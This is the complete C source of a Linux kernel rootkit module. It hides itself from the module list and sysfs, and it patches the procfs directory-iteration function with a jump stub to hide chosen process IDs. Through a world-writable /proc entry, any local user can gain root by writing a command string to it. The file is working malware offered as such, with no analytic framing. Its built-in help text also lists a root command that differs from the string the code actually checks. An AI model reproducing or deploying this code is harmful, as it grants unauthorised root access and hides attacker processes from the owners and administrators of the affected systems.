#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");

#define MIN(x,y) ((x) < (y) ? (x) : (y))
// #define unprotect_memory()	(write_cr0(read_cr0() & (~0x10000)))
// #define protect_memory() 	(write_cr0(read_cr0() | 0x10000))
#define R00TKIT_NAME 	"rootkit"
#define R00TKIT_NAMELEN 0xA
#define R00TKIT_PROCFS_ENTRYNAME  "rootkit"
#define R00TKIT_PROCFS_ENTRYPERM  0666
#define INSTALL_PARASITE 	1
#define REMOVE_PARASITE 	!INSTALL_PARASITE
#define PARASITE		"\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
#define PARASITE_LEN		0xc
#define PARASITE_ADDROFF	0x2
#define GIVEROOTPERM_CMD "root"
#define HIDEPID_CMD 	 "hidepid"
#define UNHIDEPID_CMD 	 "unhidepid"

#define HIDEPID_CMD_LEN 	0x7
#define UNHIDEPID_CMD_LEN 	0x9
#define PID_STR_MAXLEN 0x8



//for 4.X
//copied from /fs/proc/internal.h 
struct proc_dir_entry {
	unsigned int low_ino;
	umode_t mode;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	struct proc_dir_entry *parent;
	struct rb_root subdir;
	struct rb_node subdir_node;
	void *data;
	atomic_t count;		/* use count */
	atomic_t in_use;	/* number of callers into module in progress; */
			/* negative -> it's going away RSN */
	struct completion *pde_unload_completion;
	struct list_head pde_openers;	/* who did ->open, but not ->release */
	spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
	u8 namelen;
	char name[];
};

struct dircontext
{
	filldir_t actor;
	loff_t pos;
};



struct hooked_function
{
	void *hooked_function_addr;
	struct list_head hook_list;
	char org_code[PARASITE_LEN];
	char parasite[PARASITE_LEN];
};



struct hidden_pids
{
	struct list_head pids_list;
	char pidstr[PID_STR_MAXLEN];
};


static int filesystem_procfs_hook_iterate(struct file *,struct dir_context *);


static int procfs_filldir(void *,const char *,int,loff_t,u64,unsigned int);


static int 	procfs_entry_init(void);
static ssize_t 	procfs_write(struct file *,const char __user *,size_t,loff_t*);
static ssize_t  procfs_read(struct file *,char __user *,size_t,loff_t *); 
static int 	hide_pid(const char *,size_t);
static int  unhide_pid(const char *,size_t);


static int 	hooklist_append(void *,void *);
static void inject_parasite(void *,unsigned char);
static int 	hook_func(void);
static void unhook_func(void);	

static void hide_proc(void);

static int (*struct_procfs_iterate)(struct file *fp,struct dir_context *ctx);

static filldir_t struct_procfs_filldir;

LIST_HEAD(hidden_pids_listhead);

static struct file_operations procfs_fops_struct = 
{
	.write = procfs_write,
	.read  = procfs_read
};
static struct proc_dir_entry *procfs_entry,*procfs_root;

static int procfs_entry_init(void)
{
	procfs_entry = proc_create(R00TKIT_PROCFS_ENTRYNAME,
					   R00TKIT_PROCFS_ENTRYPERM,
				   	   NULL,
					   &procfs_fops_struct);

	if (procfs_entry == NULL)
		return 0;

	procfs_root = procfs_entry->parent;

	return 1;
}

static int hide_pid(const char *buf,size_t count)
{
	struct hidden_pids *hidden_pid;

	hidden_pid = (struct hidden_pids *)kzalloc(sizeof(struct hidden_pids),GFP_KERNEL);

	if (hidden_pid == NULL)
		return 0;

	list_add(&hidden_pid->pids_list,&hidden_pids_listhead);

	strncpy(hidden_pid->pidstr,&buf[HIDEPID_CMD_LEN],MIN(count - HIDEPID_CMD_LEN,PID_STR_MAXLEN - 1));

	return 1;
}

static int unhide_pid(const char *buf,size_t count)
{
	struct hidden_pids *hidden_pid,*next_hidden_pid;

	list_for_each_entry_safe(hidden_pid,next_hidden_pid,&hidden_pids_listhead,pids_list)
	{
		if (strncmp(hidden_pid->pidstr,&buf[UNHIDEPID_CMD_LEN],MIN(count - UNHIDEPID_CMD_LEN,PID_STR_MAXLEN - 1)) == 0)
		{
			list_del(&hidden_pid->pids_list);
			kfree(hidden_pid);
			return 1;
		}
	}

	return 0;
}

static ssize_t procfs_write(struct file *fp,
				    const char __user *buf,
				    size_t count,
				    loff_t *offp)
{

	struct cred *new_credentials;

	if (strcmp(buf,GIVEROOTPERM_CMD) == 0)
	{

		new_credentials = prepare_creds();

		if (new_credentials != NULL)
		{
			new_credentials->uid 	= (kuid_t) { 0 };
			new_credentials->gid 	= (kgid_t) { 0 };
			new_credentials->euid	= (kuid_t) { 0 };
			new_credentials->egid	= (kgid_t) { 0 };
			new_credentials->suid	= (kuid_t) { 0 };
			new_credentials->sgid	= (kgid_t) { 0 };
			new_credentials->fsuid	= (kuid_t) { 0 };
			new_credentials->fsgid	= (kgid_t) { 0 };

			commit_creds(new_credentials);

		}

	}


	else if (strncmp(buf,HIDEPID_CMD,HIDEPID_CMD_LEN) == 0)
	{
		if (count == HIDEPID_CMD_LEN)
			return -1;

		if (!hide_pid(buf,count))
			return -1;
	}

	else if(strncmp(buf,UNHIDEPID_CMD,UNHIDEPID_CMD_LEN) == 0)
	{
		if (count == UNHIDEPID_CMD_LEN)
			return -1;

		if (!unhide_pid(buf,count))
			return -1;
	}

	return count;
}

static ssize_t procfs_read(struct file *fp,
				   char __user *buf,
				   size_t count,
				   loff_t *offset)
{
	const char rootkit_cmds[] = 
				"###########################\n"
				"Commands\n"
				"###########################\n\n"
				"\t* [givemerootprivileges] -->> to gain root access\n"
				"\t* [hidepidPID] -->> to hide a given pid. replace (PID) with target pid\n"
				"\t* [unhidepidPID] -->> to unhide a given pid. replace (PID) with target pid\n"
				"\x00";

	if (copy_to_user(buf,rootkit_cmds,strlen(rootkit_cmds)))
		return -EFAULT;

	if (*offset != 0)
		return 0;

	*offset += 1;
	return (ssize_t)strlen(rootkit_cmds);
}

static int dup_procfs_filldir(void *_buf,
				  const char *name,
				  int namelen,
				  loff_t offset,
				  u64 ino,
				  unsigned int d_type)
{

	struct hidden_pids *hidden_pid;


	list_for_each_entry(hidden_pid,&hidden_pids_listhead,pids_list)
	{
		if (strcmp(hidden_pid->pidstr,name) == 0)
			return 0;
	}

	if (strcmp(name,R00TKIT_PROCFS_ENTRYNAME) == 0)
		return 0;

	return struct_procfs_filldir(_buf,name,namelen,offset,ino,d_type);
}

LIST_HEAD(hooked_functions_listhead);

static int filesystem_procfs_hook_iterate(struct file *fp, struct dir_context *ctx)
{
	int retval;
	struct dircontext *kit_ctx = (struct dircontext *)ctx;
	struct_procfs_filldir = ctx->actor;
	kit_ctx->actor = (filldir_t)dup_procfs_filldir;
	inject_parasite(struct_procfs_iterate,REMOVE_PARASITE);
	retval = struct_procfs_iterate(fp,(struct dir_context *)kit_ctx);
	inject_parasite(struct_procfs_iterate,INSTALL_PARASITE);
	return retval;
} 

static int hooklist_append(void *target_func_addr,void *func)
{
		char parasite[PARASITE_LEN] = PARASITE;
		struct hooked_function *hook;

		hook = (struct hooked_function *)kmalloc(sizeof(struct hooked_function),GFP_KERNEL);

		if (hook == NULL)
			return 0;


		//replace zeros with address of rootkit's function
		*((unsigned long *)(&parasite[PARASITE_ADDROFF])) = (unsigned long)func;

		/*
		[]fill in hooked_functions_info struct of this targeted function. 
		[]add to the list of hooked functions 
		*/
		memcpy(hook->parasite,parasite,PARASITE_LEN);
		memcpy(hook->org_code,target_func_addr,PARASITE_LEN);

		hook->hooked_function_addr = target_func_addr;

		list_add(&hook->hook_list,&hooked_functions_listhead);

		return 1;
}

static void inject_parasite(void *target_func_addr,unsigned char install_parasite)
{
	struct hooked_function *hook;
 
	preempt_disable();

	write_cr0(read_cr0() & (~ 0x10000));
			
	list_for_each_entry(hook,&hooked_functions_listhead,hook_list)
	{
		if (hook->hooked_function_addr == target_func_addr)
		{

			if (install_parasite)
			{
				memcpy(target_func_addr,hook->parasite,PARASITE_LEN);
			}else
			{
				memcpy(target_func_addr,hook->org_code,PARASITE_LEN);
			}
		}
	}

	write_cr0(read_cr0() | 0x10000);

	preempt_enable();
}


static int hook_func()
{
	struct file *procfs_fp;
	struct file_operations *procfs_fops;

	if ((procfs_fp = filp_open("/proc",O_RDONLY,0)) == NULL)
		return 0;

	procfs_fops = (struct file_operations *)procfs_fp->f_op;

	struct_procfs_iterate = procfs_fops->iterate;
	if (!hooklist_append(struct_procfs_iterate,filesystem_procfs_hook_iterate))
		return 0;

	inject_parasite(struct_procfs_iterate,INSTALL_PARASITE);
	
	filp_close(procfs_fp,0);

	return 1;
}

static void unhook_func()
{
	struct hooked_function *current_hooked,*next_hooked;

	inject_parasite(struct_procfs_iterate,REMOVE_PARASITE);

	//free the list of hooked functions
	list_for_each_entry_safe(current_hooked,next_hooked,&hooked_functions_listhead,hook_list)
	{
		list_del(&current_hooked->hook_list);
		kfree(current_hooked);
	}

}


static void hide_proc()
{
	list_del_init(&THIS_MODULE->list); 	/* hide from /proc/modules */
	kobject_del(&THIS_MODULE->mkobj.kobj);	/* remove rootkit's sysfs entry	*/
}



static int rootkit_init(void)
{

	hide_proc();

	if (!hook_func())
		return -1;
	
	if (!procfs_entry_init())
		return -1;

	return 0;
}

static void rootkit_exit(void)
{

	remove_proc_entry(R00TKIT_PROCFS_ENTRYNAME,procfs_root);

	unhook_func();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
